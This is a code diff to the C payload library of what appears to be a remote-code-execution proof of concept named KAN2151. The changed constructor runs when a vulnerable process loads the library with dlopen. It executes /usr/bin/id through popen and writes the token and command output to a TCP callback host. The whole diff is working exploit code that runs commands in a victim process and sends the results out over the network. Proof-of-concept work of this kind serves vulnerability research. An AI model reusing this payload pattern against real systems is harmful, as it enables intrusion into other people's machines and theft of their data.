@@ -1,5 +1,6 @@
 #include <arpa/inet.h>
 #include <netinet/in.h>
+#include <stdio.h>
 #include <string.h>
 #include <sys/socket.h>
 #include <unistd.h>
@@ -16,15 +17,40 @@
 #define CALLBACK_TOKEN "UNSET"
 #endif
 
+static void write_all(int fd, const char *data, size_t length) {
+  while (length > 0) {
+    ssize_t written = write(fd, data, length);
+    if (written <= 0) {
+      return;
+    }
+    data += written;
+    length -= (size_t)written;
+  }
+}
+
 /*
- * Minimal, non-shell RCE proof.  dlopen invokes this constructor inside the
- * vulnerable process.  A per-run token prevents an old or unrelated network
- * connection from being counted as exploit success.
+ * dlopen invokes this constructor inside the vulnerable process.  It runs a
+ * fixed, non-configurable proof command and returns its output.  The per-run
+ * token only correlates the result with this exploit attempt; /usr/bin/id is
+ * the visible proof of command execution.
  */
 __attribute__((constructor))
 static void callback(void) {
-  static const char proof[] =
-      "KAN2151_RCE_CALLBACK " CALLBACK_TOKEN "\n";
+  static const char header[] =
+      "KAN2151_RCE_CALLBACK " CALLBACK_TOKEN "\n"
+      "KAN2151_COMMAND /usr/bin/id\n";
+  char command_output[1024] = {0};
+  FILE *command = popen("/usr/bin/id", "r");
+  if (command == NULL) {
+    return;
+  }
+  size_t output_length = fread(
+      command_output, 1, sizeof(command_output) - 1, command);
+  int command_status = pclose(command);
+  if (command_status != 0 || output_length == 0) {
+    return;
+  }
+
   struct sockaddr_in address;
   int fd = socket(AF_INET, SOCK_STREAM, 0);
   if (fd < 0) {
@@ -38,8 +64,8 @@ static void callback(void) {
     return;
   }
   if (connect(fd, (struct sockaddr *)&address, sizeof(address)) == 0) {
-    ssize_t written = write(fd, proof, sizeof(proof) - 1);
-    (void)written;
+    write_all(fd, header, sizeof(header) - 1);
+    write_all(fd, command_output, output_length);
   }
   (void)close(fd);
 }
